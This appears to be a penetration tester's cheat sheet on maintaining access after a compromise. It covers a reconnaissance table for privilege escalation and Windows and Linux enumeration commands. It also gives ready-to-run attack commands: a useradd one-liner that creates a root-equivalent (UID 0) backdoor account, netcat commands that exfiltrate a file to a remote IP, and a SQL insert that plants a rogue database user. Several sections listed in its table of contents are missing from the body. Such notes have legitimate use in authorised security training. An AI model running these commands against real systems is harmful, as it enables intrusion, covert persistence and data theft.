# Maintaining Access
## Table of Contents
* [Information to Gather for Privilege Escalation](#information-to-gather-for-privilege-escalation)
* [Gathering Information on a Windows System](#gathering-information-on-a-windows-system)
* [Gathering Information on a Linux System](#gathering-information-on-a-linux-system)
* [One-liner: useradd and chpasswd](#one-liner-useradd-and-chpasswd)
* [Dump Passwords](#dump-passwords)
* [Find Password Files](#find-password-files)
* [Find Emailboxes](#find-emailboxes)
* [Get Network Connections](#get-network-connections)
* [Exfil via Netcat](#exfil-via-netcat)

## Privilege Escalation
### Information to Gather for Privilege Escalation
| Information | Benefit to Privilege Escalation |
| ----------- | ------------------------------- |
| User Context |Establish who you are before working towards who you want to be. |
| Hostname | Discover the system’s role, naming convention, OS, etc. |
| OS Version | Find matching kernel exploits. |
| Kernel Version | Find matching kernel exploits (exploit the core of the OS). |
| System Architecture | Find matching exploits. |
| Processes and Services | Determine which are running under a privilege account and vulnerable to a known exploit and/or configured with weak permissions. |
| Network Information | Identify pivot options to other machines/networks (adapter configs, routes, TCP connections and their process owners), and determine if anti-virus or virtualization software is running. |
| Firewall Status and Rules | Determine if a service blocked remotely is allowed via loopback; find rules that allow any inbound traffic. |
| Scheduled Tasks | Identify automated tasks running under an administrator-context; find file-paths to files with weak permissions. |
| Programs and Patch Levels | Find matching exploits; HotFixId and InstalledOn represent quality of patch mgmt; qfe = quick fix engineering. |
| Readable/Writable Files and Directories | Find credentials and/or files (that run under a privileged account) that can be modified/overwritten: look for files readable and/or writable by “Everyone,” groups you’re part of, etc. |
| Unmounted Drives | Find credentials. | 
| Device Drivers and Kernel Modules | Find matching exploits. |
| AutoElevate Settings and Binaries | Find settings and/or files that run as the file owner when invoked. If AlwaysInstallElevated is enabled, exploit via a malicious .msi file. |

### Gathering Information on a Windows System
```bash
whoami # print my current user context
net user victor # print my group memberships, password policy, etc.   
net user # print other accounts on this system
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### Gathering Information on a Linux System
```bash
whoami # output shows your current user context
id # print my current user context, uid, and gid
cat /etc/passwd # print other accounts on this system
hostname
uname -a # print kernel version and system architecture
cat /etc/issue # print OS version
cat /etc/*-release # print OS version
netstat -pant 
```

## Persistence
### Add a new user
```bash
useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 -m victor
```

## Effect
### Exfil via Netcat
```bash
nc -nvlp 5050 > stolen.exe
nc.exe -w3 10.11.12.13 5050 < stealme.exe
```

### Add a new user to a SQL database
```sql
INSERT INTO targetdb.usertbl(username, password) VALUES ('victor','please');
```